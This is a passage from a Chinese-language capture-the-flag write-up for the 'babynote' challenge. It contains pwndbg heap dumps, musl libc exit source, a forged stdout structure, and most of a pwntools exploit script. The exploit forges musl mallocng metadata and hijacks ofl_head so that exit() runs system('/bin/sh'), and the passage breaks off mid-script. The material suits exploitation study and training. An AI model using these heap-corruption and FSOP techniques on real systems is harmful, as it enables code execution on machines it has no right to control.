class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fde0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x001b890000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdf0</span>:\t<span class=\"number\">0x00007f22b639fc40</span>\t<span class=\"number\">0x00007f22b6394020</span>\t<span class=\"comment\">//babynotelist的头指针，</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe00</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000002030</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe10</span>:\t<span class=\"number\">0x00007f22b639fd60</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe20</span>:\t<span class=\"number\">0x0000555556925090</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到我们可以通过 b’b’(0x00007f22b63a3dd0 的数据是‘b’) 找到我们的 fake_babynote, 然后释放掉 0x00007f22b6395070 这个伪 slot</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">18</span>gx <span class=\"number\">0x00007f22b6395070</span><span class=\"number\">-0x60</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395010</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395020</span>:\t<span class=\"number\">0x00007f22b63a7e20</span>\t<span class=\"number\">0x00007f22b63a2e20</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395030</span>:\t<span class=\"number\">0x00007f22b6395060</span>\t<span class=\"number\">0x00000000000003fe</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395040</span>:\t<span class=\"number\">0x00000000000000a9</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395050</span>:\t<span class=\"number\">0x00007f22b6396020</span>\t<span class=\"number\">0x0000c00000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395060</span>:\t<span class=\"number\">0x00007f22b6395020</span>\t<span class=\"number\">0x0000800000000009</span>\t\t\t<span class=\"comment\">//伪造的slot堆头</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395070</span>:\t<span class=\"number\">0x4141414141414141</span>\t<span class=\"number\">0x0000000000000000</span>\t\t\t</span><br><span class=\"line\"><span class=\"number\">0x7f22b6395080</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395090</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x7f22b6395060 这个地址就是伪造的 group 的 base 地址，对应的数据就是伪造的 meta 地址</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200825484.png\" alt=\"image-20220422200825484\"></p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200924302.png\" alt=\"image-20220422200924302\"></p>\n<p>0x00007f22b63a7e20 这里就是我们的目标地址 - 8，0x00007f22b63a2e20 这个地址是我们下一个申请出来的 slot 的真实地址（申请 0x50）mem==base,</p>\n<p>下面是伪造的 fake_meta1 以及对应的 fake_meta_area1</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201357563.png\" alt=\"image-20220422201357563\"></p>\n<p>最后是 free_group 时的伪造的 fake_meta2 和 fake_meta_area</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201627965.png\" alt=\"image-20220422201627965\"></p>\n<h4 id=\"fsop\"><a class=\"markdownIt-Anchor\" href=\"#fsop\">#</a> FSOP</h4>\n<p>我们任意地址写的，是 ofl_head，类似于 glibc 的 ——IO__lisl_all, 只不过则合理一般情况下是空的，利用在于 exit 函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">_Noreturn</span> <span class=\"type\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(<span class=\"type\">int</span> code)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__funcs_on_exit();</span><br><span class=\"line\">\t__libc_exit_fini();</span><br><span class=\"line\">\t__stdio_exit();</span><br><span class=\"line\">\t_Exit(code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __stdio_exit(<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFILE *f;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class=\"line\">\tclose_file(__stdin_used);</span><br><span class=\"line\">\tclose_file(__stdout_used);</span><br><span class=\"line\">\tclose_file(__stderr_used);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">FILE **__ofl_lock()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLOCK(ofl_lock);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &amp;ofl_head;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">close_file</span><span class=\"params\">(FILE *f)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!f) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tFFINALLOCK(f);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把 ofl_head 改成我们可以控制的 slot 的地址，就在那里伪造一个 stdout，if (f-&gt;wpos != f-&gt;wbase) f-&gt;write (f, 0, 0); 并满足这里的条件（wpos!=wbase）write 改策划给你 system, 而且会把 fd 作为参数，fd 就是就会指向 flags, 把他写位‘/bin/sh\\x00’</p>\n<p>正常的 stdout</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *<span class=\"built_in\">stdout</span></span><br><span class=\"line\">$<span class=\"number\">21</span> = &#123;</span><br><span class=\"line\">  flags = <span class=\"number\">69</span>, </span><br><span class=\"line\">  rpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  rend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  close = <span class=\"number\">0x7f22b61557e5</span> &lt;__stdio_close&gt;, </span><br><span class=\"line\">  wend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_1 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wbase = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  read = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  write = <span class=\"number\">0x7f22b615598e</span> &lt;__stdio_write&gt;, </span><br><span class=\"line\">  seek = <span class=\"number\">0x7f22b615597d</span> &lt;__stdio_seek&gt;, </span><br><span class=\"line\">  buf = <span class=\"number\">0x7f22b63a6708</span> &lt;buf+<span class=\"number\">8</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">  buf_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">1</span>, </span><br><span class=\"line\">  pipe_pid = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lockcount = <span class=\"number\">0</span>, </span><br><span class=\"line\">  mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">  lock = <span class=\"number\">-1</span>, </span><br><span class=\"line\">  lbf = <span class=\"number\">-1</span>, </span><br><span class=\"line\">  cookie = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  off = <span class=\"number\">0</span>, </span><br><span class=\"line\">  getln_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_2 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shlim = <span class=\"number\">0</span>, </span><br><span class=\"line\">  shcnt = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  locale = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面是伪造的 stdout</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p * (FILE * <span class=\"type\">const</span>)<span class=\"number\">0x7fc49ff72e20</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  flags = <span class=\"number\">1852400175</span>, </span><br><span class=\"line\">  rpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  rend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  close = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_1 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wbase = <span class=\"number\">0x1</span> &lt;error: Cannot access memory at address <span class=\"number\">0x1</span>&gt;, </span><br><span class=\"line\">  read = <span class=\"number\">0x1</span>, </span><br><span class=\"line\">  write = <span class=\"number\">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class=\"line\">  seek = <span class=\"number\">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class=\"line\">  buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  buf_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0</span>, </span><br><span class=\"line\">  pipe_pid = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lockcount = <span class=\"number\">0</span>, </span><br><span class=\"line\">  mode = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lock = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lbf = <span class=\"number\">0</span>, </span><br><span class=\"line\">  cookie = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  off = <span class=\"number\">0</span>, </span><br><span class=\"line\">  getln_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_2 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shlim = <span class=\"number\">0</span>, </span><br><span class=\"line\">  shcnt = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  locale = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后 exit 结束程序</p>\n<h2 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h2>\n<p>部分注释可能错误</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level =<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so&quot;</span>)</span><br><span class=\"line\">r=process([<span class=\"string\">&quot;./libc.so&quot;</span>,<span class=\"string\">&#x27;./babynote&#x27;</span>])</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./babynote&#x27;</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get8</span>():</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\t\tret = r.recv(<span class=\"number\">2</span>)+ret</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;0x&#x27;</span>+ret</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(ret,<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get4</span>():</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\tret = r.recv(<span class=\"number\">2</span>)+ret</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;0x&#x27;</span>+ret</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(ret,<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;option:&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">name,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;name size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(name)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;name&quot;</span>,name)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(text)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;content&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;name size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(name)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;name&quot;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;name size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(name)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;name&quot;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">clean</span>():\t\t\t<span class=\"comment\">#only set list=0 </span></span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b malloc&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#slot full size is 0x2c</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x50</span>)<span class=\"comment\">#slot full size is 0x6c</span></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t\t<span class=\"comment\">#free the first note,the meta(0xc)is freed,</span></span><br><span class=\"line\">clean()\t\t\t\t\t<span class=\"comment\">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>)\t\t<span class=\"comment\">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#then reuse the free slot in meta(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>,<span class=\"string\">b&#x27;b&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#fill up meta2(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;f&#x27;</span>,<span class=\"string\">b&#x27;f&#x27;</span>*<span class=\"number\">0x50</span>)\t\t<span class=\"comment\">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class=\"line\"></span><br><span class=\"line\">find(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;0x28:&quot;</span>)</span><br><span class=\"line\">ss = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">\tss = r.recv(<span class=\"number\">2</span>)+ss</span><br><span class=\"line\">ss  = <span class=\"string\">b&#x27;0x&#x27;</span>+ss</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ss)</span><br><span class=\"line\">heap_addr = <span class=\"built_in\">int</span>(ss,<span class=\"number\">16</span>) </span><br><span class=\"line\">libcbase = heap_addr-  <span class=\"number\">0x29fdf0</span></span><br><span class=\"line\">stdout = libcbase + <span class=\"number\">0x2a0e00</span></span><br><span class=\"line\">system = libcbase + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">__malloc_context = <span class=\"number\">0x2a1aa0</span>+libcbase</span><br><span class=\"line\">ofl_head = libcbase+ <span class=\"number\">0x2a3e28</span> </span><br><span class=\"line\">fake_stdout_addr = libcbase+<span class=\"number\">0x29ee20</span>\t\t\t<span class=\"comment\">#we can malloc0x50 to get </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;stdout : &quot;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#here we can leak anywhere</span></span><br><span class=\"line\">pad = p64(libcbase+<span class=\"number\">0x29fdb0</span>)+p64(__malloc_context)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x420</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">find(pad)</span><br><span class=\"line\">find(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#leak __malloc_context to  get meta addr</span></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;0x420:&quot;</span>)</span><br><span class=\"line\">secret =get8()</span><br><span class=\"line\">r.recv(<span class=\"number\">16</span>)</span><br><span class=\"line\">free_meta = get8()</span><br><span class=\"line\">avail_meta = get8()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">\tget8()</span><br><span class=\"line\">active=<span class=\"built_in\">list</span>()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">48</span>):</span><br><span class=\"line\">\tactive.append(get8())</span><br><span 